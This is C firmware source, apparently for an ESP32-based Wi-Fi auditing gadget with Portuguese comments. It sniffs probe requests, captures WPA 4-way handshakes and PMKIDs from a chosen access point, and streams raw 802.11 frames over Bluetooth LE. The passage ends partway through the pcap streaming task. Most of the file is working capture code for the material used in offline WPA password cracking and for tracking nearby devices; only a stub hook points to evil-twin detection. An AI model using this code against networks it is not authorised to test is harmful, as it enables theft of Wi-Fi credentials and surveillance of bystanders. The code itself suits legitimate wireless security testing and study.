#include "sniff_wifi.h"
#include "tlv.h"
#include "transport_ble.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "sniff-wifi";

// Hook opcional do watchdog. Declarado weak pra não exigir o componente
// watchdog no build do sniff_wifi. Se watchdog component está linkado,
// símbolo forte sobrescreve; senão, hook é no-op.
__attribute__((weak)) void watchdog_hook_evil_twin(const uint8_t bssid_a[6],
        int8_t rssi_a, const uint8_t bssid_b[6], int8_t rssi_b, uint8_t channel)
{
    (void)bssid_a; (void)rssi_a; (void)bssid_b; (void)rssi_b; (void)channel;
}

#define MAX_DEDUP_ENTRIES   256
#define MAX_SSID_LEN        32

// EAPOL TLV: header(16) + frame bytes (até MTU-4-16 = 227 bytes).
// Frames EAPOL típicos: 121–189 bytes. Pode truncar M3 (~189–250B com KEK).
#define EAPOL_FRAME_MAX     227
#define EAPOL_TLV_HDR       16

typedef struct {
    uint8_t mac[6];
    uint8_t ssid_len;
    char    ssid[MAX_SSID_LEN];
} dedup_entry_t;

typedef struct {
    uint8_t  ch_min;
    uint8_t  ch_max;
    uint16_t dwell_ms;
    uint16_t duration_sec;
} probe_ctx_t;

typedef struct {
    uint8_t  bssid[6];
    uint8_t  channel;
    uint16_t duration_sec;
} eapol_ctx_t;

static volatile sniff_mode_t s_mode = SNIFF_MODE_IDLE;
static volatile bool s_stop = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

// Estado promisc (probe)
static dedup_entry_t *s_dedup = NULL;
static volatile size_t s_dedup_count = 0;
static volatile uint32_t s_total_frames = 0;
static volatile uint8_t s_current_channel = 0;

// Estado promisc (eapol)
static volatile uint8_t s_eapol_target_bssid[6];
static volatile uint8_t s_eapol_count = 0;
static volatile uint8_t s_eapol_msg_mask = 0;

bool sniff_wifi_busy(void)
{
    return s_mode != SNIFF_MODE_IDLE;
}

sniff_mode_t sniff_wifi_mode(void)
{
    return s_mode;
}

esp_err_t sniff_wifi_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Probe sniff
// ----------------------------------------------------------------------

static bool dedup_check_and_add(const uint8_t mac[6],
                                 const uint8_t *ssid, uint8_t ssid_len)
{
    for (size_t i = 0; i < s_dedup_count; i++) {
        if (memcmp(s_dedup[i].mac, mac, 6) == 0 &&
            s_dedup[i].ssid_len == ssid_len &&
            memcmp(s_dedup[i].ssid, ssid, ssid_len) == 0) {
            return false;
        }
    }
    if (s_dedup_count >= MAX_DEDUP_ENTRIES) return false;
    memcpy(s_dedup[s_dedup_count].mac, mac, 6);
    s_dedup[s_dedup_count].ssid_len = ssid_len;
    if (ssid_len) memcpy(s_dedup[s_dedup_count].ssid, ssid, ssid_len);
    s_dedup_count++;
    return true;
}

static void emit_probe(const uint8_t mac[6], int8_t rssi, uint8_t channel,
                       const uint8_t *ssid, uint8_t ssid_len)
{
    uint8_t payload[9 + MAX_SSID_LEN];
    memcpy(&payload[0], mac, 6);
    payload[6] = (uint8_t)rssi;
    payload[7] = channel;
    payload[8] = ssid_len;
    if (ssid_len) memcpy(&payload[9], ssid, ssid_len);

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_PROBE_REQ, s_seq++,
                           payload, 9 + ssid_len);
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void emit_probe_done(uint16_t unique, uint16_t total_frames,
                             uint32_t scan_ms, uint8_t status)
{
    uint8_t payload[9];
    payload[0] = (uint8_t)(unique >> 8);
    payload[1] = (uint8_t)(unique & 0xFF);
    payload[2] = (uint8_t)(total_frames >> 8);
    payload[3] = (uint8_t)(total_frames & 0xFF);
    payload[4] = (uint8_t)(scan_ms >> 24);
    payload[5] = (uint8_t)(scan_ms >> 16);
    payload[6] = (uint8_t)(scan_ms >> 8);
    payload[7] = (uint8_t)(scan_ms & 0xFF);
    payload[8] = status;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_PROBE_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void promisc_cb_probe(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 4) return;
    if (payload[0] != 0x40) return; // probe request

    s_total_frames++;

    const uint8_t *src = &payload[10];
    const uint8_t *ies = &payload[24];
    uint16_t ies_len = len - 24 - 4;
    if (ies_len < 2) return;
    if (ies[0] != 0x00) return;
    uint8_t ssid_len = ies[1];
    if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
    if (2 + ssid_len > ies_len) return;
    const uint8_t *ssid = &ies[2];

    if (!dedup_check_and_add(src, ssid, ssid_len)) return;

    int8_t rssi = pkt->rx_ctrl.rssi;
    emit_probe(src, rssi, s_current_channel, ssid, ssid_len);
}

static void probe_task(void *arg)
{
    probe_ctx_t *ctx = (probe_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_dedup = calloc(MAX_DEDUP_ENTRIES, sizeof(dedup_entry_t));
    if (!s_dedup) {
        ESP_LOGE(TAG, "dedup alloc failed");
        emit_probe_done(0, 0, 0, 2);
        goto cleanup;
    }
    s_dedup_count = 0;
    s_total_frames = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_probe_done(0, 0, 0, 2);
        goto cleanup_dedup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_probe);

    uint8_t ch = ctx->ch_min;
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        s_current_channel = ch;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(ctx->dwell_ms));
        ch = (ch >= ctx->ch_max) ? ctx->ch_min : (ch + 1);
    }

    esp_wifi_set_promiscuous(false);

    uint8_t status = (s_dedup_count >= MAX_DEDUP_ENTRIES) ? 1 : 0;
    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_probe_done((uint16_t)s_dedup_count, (uint16_t)s_total_frames,
                    elapsed, status);
    ESP_LOGI(TAG, "probe_sniff done: %u unique / %u frames in %u ms",
             (unsigned)s_dedup_count, (unsigned)s_total_frames,
             (unsigned)elapsed);

cleanup_dedup:
    free(s_dedup);
    s_dedup = NULL;
cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_probe_start(uint8_t ch_min, uint8_t ch_max,
                                 uint16_t dwell_ms, uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (ch_min == 0 || ch_min > 13) return ESP_ERR_INVALID_ARG;
    if (ch_max == 0 || ch_max > 13) return ESP_ERR_INVALID_ARG;
    if (ch_max < ch_min) return ESP_ERR_INVALID_ARG;
    if (dwell_ms < 100)   dwell_ms = 100;
    if (dwell_ms > 5000)  dwell_ms = 5000;
    if (duration_sec == 0) duration_sec = 30;
    if (duration_sec > 300) duration_sec = 300;

    probe_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->ch_min = ch_min;
    ctx->ch_max = ch_max;
    ctx->dwell_ms = dwell_ms;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_PROBE;
    s_stop = false;
    if (xTaskCreate(probe_task, "probe_sniff", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "probe_sniff started: ch=%u..%u dwell=%ums duration=%us",
             ch_min, ch_max, (unsigned)dwell_ms, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_probe_stop(void)
{
    if (s_mode != SNIFF_MODE_PROBE) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// EAPOL capture (WPA 4-way handshake)
// ----------------------------------------------------------------------

// Tenta classificar a mensagem (1..4) pelo Key Information do EAPOL-Key.
// `key_info` é o campo de 16 bits em network byte order (já swap).
//   bit 8  (0x0100) = MIC
//   bit 7  (0x0080) = ACK
//   bit 6  (0x0040) = Install
//   bit 9  (0x0200) = Secure
//
// Detecção:
//   M1: ACK && !MIC
//   M2: !ACK && MIC && !Secure && !Install
//   M3: ACK && MIC && Install
//   M4: !ACK && MIC && Secure && !Install
static uint8_t classify_eapol_msg(uint16_t key_info)
{
    bool ack     = (key_info & 0x0080) != 0;
    bool mic     = (key_info & 0x0100) != 0;
    bool install = (key_info & 0x0040) != 0;
    bool secure  = (key_info & 0x0200) != 0;

    if (ack && !mic) return 1;
    if (!ack && mic && !secure && !install) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && secure && !install) return 4;
    return 0;
}

static void emit_eapol(const uint8_t bssid[6], const uint8_t sta[6],
                       uint8_t msg_index, uint8_t flags,
                       uint16_t orig_frame_len,
                       const uint8_t *frame, size_t emit_len)
{
    uint8_t payload[EAPOL_TLV_HDR + EAPOL_FRAME_MAX];
    memcpy(&payload[0], bssid, 6);
    memcpy(&payload[6], sta,   6);
    payload[12] = msg_index;
    payload[13] = flags;
    payload[14] = (uint8_t)(orig_frame_len >> 8);
    payload[15] = (uint8_t)(orig_frame_len & 0xFF);
    if (emit_len > EAPOL_FRAME_MAX) emit_len = EAPOL_FRAME_MAX;
    memcpy(&payload[EAPOL_TLV_HDR], frame, emit_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_WPA_EAPOL, s_seq++,
                           payload, EAPOL_TLV_HDR + emit_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_capture_done(const uint8_t bssid[6], uint8_t frames_count,
                               uint8_t msg_mask, uint32_t elapsed_ms,
                               uint8_t status)
{
    uint8_t payload[13];
    memcpy(&payload[0], bssid, 6);
    payload[6] = frames_count;
    payload[7] = msg_mask;
    payload[8]  = (uint8_t)(elapsed_ms >> 24);
    payload[9]  = (uint8_t)(elapsed_ms >> 16);
    payload[10] = (uint8_t)(elapsed_ms >> 8);
    payload[11] = (uint8_t)(elapsed_ms & 0xFF);
    payload[12] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_WPA_CAPTURE_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_eapol(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 8 + 4) return;

    // Type bits no FC byte 0: bits 2..3. Data type = 0b10 → mask 0x0C == 0x08.
    if ((p[0] & 0x0C) != 0x08) return;

    // Protected frame? skip — EAPOL é sempre cleartext.
    if (p[1] & 0x40) return;

    // Header size: 24 bytes basic, +2 se QoS data (subtype bit 7 do byte 0).
    bool qos = (p[0] & 0x80) != 0;
    uint16_t hdr_len = qos ? 26 : 24;
    if (len < hdr_len + 8 + 4) return;

    // FC byte 1 bits: ToDS=0x01, FromDS=0x02
    uint8_t ds = p[1] & 0x03;
    const uint8_t *bssid;
    const uint8_t *sta;
    uint8_t direction; // 0=to_AP, 1=from_AP
    switch (ds) {
    case 0x01: // ToDS=1 FromDS=0 → addr1=BSSID, addr2=SA(STA), addr3=DA
        bssid = &p[4]; sta = &p[10]; direction = 0;
        break;
    case 0x02: // ToDS=0 FromDS=1 → addr1=DA(STA), addr2=BSSID, addr3=SA
        bssid = &p[10]; sta = &p[4]; direction = 1;
        break;
    default:
        return; // ad-hoc / WDS — ignora
    }

    // Filtra pelo BSSID alvo
    if (memcmp(bssid, (const void *)s_eapol_target_bssid, 6) != 0) return;

    // LLC/SNAP + EtherType: AA AA 03 00 00 00 88 8E
    const uint8_t *llc = &p[hdr_len];
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;

    // EAPOL packet starts at hdr_len+8.
    // EAPOL header: version(1) + type(1) + length_be(2) = 4 bytes.
    // Type 0x03 = EAPOL-Key. Depois vem Key Information (2 bytes BE).
    if (len < hdr_len + 8 + 4 + 2 + 4) return; // sanity
    const uint8_t *eapol = &p[hdr_len + 8];
    if (eapol[1] != 0x03) return; // só interessa EAPOL-Key

    // Descriptor type (1 byte) + Key Information (2 bytes BE)
    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    uint8_t msg = classify_eapol_msg(key_info);

    // Marca o bit no msg_mask (bit0=M1, bit1=M2, ...)
    if (msg >= 1 && msg <= 4) {
        s_eapol_msg_mask |= (uint8_t)(1u << (msg - 1));
    }
    s_eapol_count++;

    // Tira FCS de 4 bytes do final pra emitir só o frame 802.11
    uint16_t orig_len = (len >= 4) ? (len - 4) : len;
    uint8_t flags = 0;
    size_t emit_len = orig_len;
    if (emit_len > EAPOL_FRAME_MAX) {
        emit_len = EAPOL_FRAME_MAX;
        flags |= 0x01; // truncated
    }

    uint8_t bssid_copy[6], sta_copy[6];
    memcpy(bssid_copy, bssid, 6);
    memcpy(sta_copy,   sta,   6);
    (void)direction;
    emit_eapol(bssid_copy, sta_copy, msg, flags, orig_len, p, emit_len);
}

static void eapol_task(void *arg)
{
    eapol_ctx_t *ctx = (eapol_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    memcpy((void *)s_eapol_target_bssid, ctx->bssid, 6);
    s_eapol_count = 0;
    s_eapol_msg_mask = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_capture_done(ctx->bssid, 0, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_eapol);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    // Loop: encerra ao receber os 4 frames OU quando deadline expirar
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        if (s_eapol_msg_mask == 0x0F) break; // M1..M4 todos vistos
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);

    uint8_t status;
    if (s_eapol_msg_mask == 0x0F)      status = 0; // ok, 4-way completo
    else if (s_eapol_count > 0)        status = 1; // parcial
    else                                status = 1; // timeout sem nada
    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_capture_done(ctx->bssid, s_eapol_count, s_eapol_msg_mask,
                      elapsed, status);
    ESP_LOGI(TAG, "wpa_capture done: %u frames, mask=0x%02x in %u ms",
             (unsigned)s_eapol_count, (unsigned)s_eapol_msg_mask,
             (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_eapol_start(const uint8_t bssid[6], uint8_t channel,
                                  uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (!bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0) duration_sec = 60;
    if (duration_sec > 600) duration_sec = 600;

    eapol_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    memcpy(ctx->bssid, bssid, 6);
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_EAPOL;
    s_stop = false;
    if (xTaskCreate(eapol_task, "wpa_capture", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "wpa_capture started: bssid=%02x:%02x:%02x:%02x:%02x:%02x ch=%u for %us",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             channel, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_eapol_stop(void)
{
    if (s_mode != SNIFF_MODE_EAPOL) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// PMKID capture (extrai PMKID KDE do M1 sem precisar do 4-way completo)
// ----------------------------------------------------------------------

#define PMKID_LEN 16

// Estado promisc (pmkid)
static volatile uint8_t s_pmkid_count = 0;

// Procura PMKID KDE no Key Data field. Retorna ponteiro pros 16 bytes do
// PMKID se encontrar, NULL caso contrário.
//
// KDE format:  type(0xDD) | length | OUI(00:0F:AC) | datatype(0x04) | PMKID(16)
// length = 4 (OUI+datatype) + 16 (pmkid) = 20 = 0x14
static const uint8_t *find_pmkid_kde(const uint8_t *kd, uint16_t kd_len)
{
    uint16_t i = 0;
    while (i + 2 <= kd_len) {
        uint8_t  t   = kd[i];
        uint8_t  len = kd[i + 1];
        if ((uint16_t)i + 2 + len > kd_len) break;
        if (t == 0xDD && len >= 4 + PMKID_LEN) {
            const uint8_t *body = &kd[i + 2];
            if (body[0] == 0x00 && body[1] == 0x0F && body[2] == 0xAC &&
                body[3] == 0x04) {
                return &body[4]; // PMKID
            }
        }
        i = (uint16_t)(i + 2 + len);
    }
    return NULL;
}

static void emit_pmkid_found(const uint8_t bssid[6], const uint8_t sta[6],
                              const uint8_t pmkid[PMKID_LEN])
{
    uint8_t payload[6 + 6 + PMKID_LEN];
    memcpy(&payload[0],  bssid, 6);
    memcpy(&payload[6],  sta,   6);
    memcpy(&payload[12], pmkid, PMKID_LEN);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PMKID_FOUND, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_pmkid_done(const uint8_t bssid[6], uint8_t count,
                             uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[12];
    memcpy(&payload[0], bssid, 6);
    payload[6]  = count;
    payload[7]  = (uint8_t)(elapsed_ms >> 24);
    payload[8]  = (uint8_t)(elapsed_ms >> 16);
    payload[9]  = (uint8_t)(elapsed_ms >> 8);
    payload[10] = (uint8_t)(elapsed_ms & 0xFF);
    payload[11] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PMKID_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_pmkid(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 8 + 4) return;

    if ((p[0] & 0x0C) != 0x08) return;      // Data type
    if (p[1] & 0x40) return;                // Protected? skip

    bool qos = (p[0] & 0x80) != 0;
    uint16_t hdr_len = qos ? 26 : 24;
    if (len < hdr_len + 8 + 4 + 95) return;

    uint8_t ds = p[1] & 0x03;
    const uint8_t *bssid;
    const uint8_t *sta;
    switch (ds) {
    case 0x01: bssid = &p[4];  sta = &p[10]; break;
    case 0x02: bssid = &p[10]; sta = &p[4];  break;
    default: return;
    }
    if (memcmp(bssid, (const void *)s_eapol_target_bssid, 6) != 0) return;

    const uint8_t *llc = &p[hdr_len];
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;

    const uint8_t *eapol = &p[hdr_len + 8];
    if (eapol[1] != 0x03) return; // EAPOL-Key

    // Filtra M1: ACK=1, MIC=0
    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    bool ack = (key_info & 0x0080) != 0;
    bool mic = (key_info & 0x0100) != 0;
    if (!(ack && !mic)) return;

    // EAPOL-Key body começa em eapol+1 (descriptor type) +
    //   key_info(2) + key_len(2) + replay(8) + nonce(32) + iv(16) +
    //   rsc(8) + reserved(8) + mic(16) = 92 bytes apos descriptor type
    // Total fixed before key_data: 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16 = 93
    // E mais key_data_len(2 bytes BE) = 95
    if (len < (uint16_t)(hdr_len + 8 + 4 + 95 + 4)) return;

    uint16_t kd_len = ((uint16_t)eapol[97] << 8) | eapol[98];
    if (kd_len == 0 || kd_len > 512) return;

    // Bound check: o payload do EAPOL pode ter sido truncado pela rádio.
    uint16_t payload_remaining = (uint16_t)(len - (hdr_len + 8 + 4 + 95) - 4); // -FCS
    if (kd_len > payload_remaining) kd_len = payload_remaining;

    const uint8_t *kd = &eapol[99];
    const uint8_t *pmkid = find_pmkid_kde(kd, kd_len);
    if (!pmkid) return;

    s_pmkid_count++;
    uint8_t bssid_copy[6], sta_copy[6], pmkid_copy[PMKID_LEN];
    memcpy(bssid_copy, bssid, 6);
    memcpy(sta_copy,   sta,   6);
    memcpy(pmkid_copy, pmkid, PMKID_LEN);
    emit_pmkid_found(bssid_copy, sta_copy, pmkid_copy);
}

static void pmkid_task(void *arg)
{
    eapol_ctx_t *ctx = (eapol_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    memcpy((void *)s_eapol_target_bssid, ctx->bssid, 6);
    s_pmkid_count = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_pmkid_done(ctx->bssid, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_pmkid);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    // Para por 1ª PMKID encontrada OU duração
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        if (s_pmkid_count >= 1) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    uint8_t status = (s_pmkid_count > 0) ? 0 : 1;
    emit_pmkid_done(ctx->bssid, s_pmkid_count, elapsed, status);
    ESP_LOGI(TAG, "pmkid_capture done: %u found in %u ms",
             (unsigned)s_pmkid_count, (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_pmkid_start(const uint8_t bssid[6], uint8_t channel,
                                  uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (!bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0) duration_sec = 60;
    if (duration_sec > 600) duration_sec = 600;

    eapol_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    memcpy(ctx->bssid, bssid, 6);
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_PMKID;
    s_stop = false;
    if (xTaskCreate(pmkid_task, "pmkid_cap", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "pmkid_capture started: bssid=%02x:%02x:%02x:%02x:%02x:%02x ch=%u",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    return ESP_OK;
}

esp_err_t sniff_wifi_pmkid_stop(void)
{
    if (s_mode != SNIFF_MODE_PMKID) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// PCAP streaming (sem storage local — direto pro app via TLV)
// ----------------------------------------------------------------------

#define PCAP_TLV_HDR        7   // ts(4) + orig_len(2) + flags(1)
#define PCAP_FRAME_MAX      (TLV_MAX_FRAME_SIZE - 4 - PCAP_TLV_HDR) // ~236
#define PCAP_RATE_LIMIT_US  5000  // 5ms = ~200 frames/s teóricos

typedef struct {
    uint8_t  channel;
    uint8_t  filter;
    bool     has_bssid;
    uint8_t  bssid[6];
    uint16_t duration_sec;
} pcap_ctx_t;

static volatile uint8_t  s_pcap_filter = 0;
static volatile bool     s_pcap_has_bssid = false;
static uint8_t           s_pcap_bssid[6];
static volatile uint16_t s_pcap_emitted = 0;
static volatile uint16_t s_pcap_dropped = 0;
static volatile int64_t  s_pcap_start_us = 0;
static volatile int64_t  s_pcap_last_emit_us = 0;

static void emit_pcap_done(uint16_t emitted, uint16_t dropped,
                            uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[9];
    payload[0] = (uint8_t)(emitted >> 8);
    payload[1] = (uint8_t)(emitted & 0xFF);
    payload[2] = (uint8_t)(dropped >> 8);
    payload[3] = (uint8_t)(dropped & 0xFF);
    payload[4] = (uint8_t)(elapsed_ms >> 24);
    payload[5] = (uint8_t)(elapsed_ms >> 16);
    payload[6] = (uint8_t)(elapsed_ms >> 8);
    payload[7] = (uint8_t)(elapsed_ms & 0xFF);
    payload[8] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PCAP_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_pcap(void *buf, wifi_promiscuous_pkt_type_t type)
{
    uint8_t mask = 0;
    switch (type) {
    case WIFI_PKT_MGMT: mask = SNIFF_PCAP_FILTER_MGMT; break;
    case WIFI_PKT_DATA: mask = SNIFF_PCAP_FILTER_DATA; break;
    case WIFI_PKT_CTRL: mask = SNIFF_PCAP_FILTER_CTRL; break;
    default: return;
    }
    if (!(s_pcap_filter & mask)) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 16) return; // RTS = 16 bytes (menor frame válido aqui)

    if (s_pcap_has_bssid) {
        bool match = false;
        if (len >= 22) {
            const uint8_t *t = (const uint8_t *)s_pcap_bssid;
            if (memcmp(&p[4],  t, 6) == 0 ||
                memcmp(&p[10], t, 6) == 0 ||
                memcmp(&p[16], t, 6) == 0) match = true;
        }
        if (!match) return;
    }

    int64_t now = esp_timer_get_time();
    if (now - s_pcap_last_emit_us < PCAP_RATE_LIMIT_US) {
        s_pcap_dropped++;
        return;
    }
    s_pcap_last_emit_us = now;

    uint16_t orig_len = (len >= 4) ? (len - 4) : len; // tira FCS
    uint16_t emit_len = orig_len;
    uint8_t flags = 0;
    if (emit_len > PCAP_FRAME_MAX) {
        emit_len = PCAP_FRAME_MAX;
        flags |= 0x01; // truncated
    }

    int64_t rel = now - s_pcap_start_us;
    if (rel < 0) rel = 0;
    uint32_t ts_us = (uint32_t)rel;

    uint8_t payload[PCAP_TLV_HDR + PCAP_FRAME_MAX];
    payload[0] = (uint8_t)(ts_us >> 24);
    payload[1] = (uint8_t)(ts_us >> 16);
    payload[2] = (uint8_t)(ts_us >> 8);
    payload[3] = (uint8_t)(ts_us & 0xFF);
    payload[4] = (uint8_t)(orig_len >> 8);
    payload[5] = (uint8_t)(orig_len & 0xFF);
    payload[6] = flags;
    memcpy(&payload[PCAP_TLV_HDR], p, emit_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PCAP_FRAME, s_seq++,
                           payload, PCAP_TLV_HDR + emit_len);
    if (total > 0) {
        transport_ble_send_stream(out, (size_t)total);
        s_pcap_emitted++;
    }
}

static void pcap_task(void *arg)
{
    pcap_ctx_t *ctx = (pcap_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_pcap_filter   = ctx->filter;
    s_pcap_has_bssid = ctx->has_bssid;
    if (ctx->has_bssid) memcpy(s_pcap_bssid, ctx->bssid, 6);
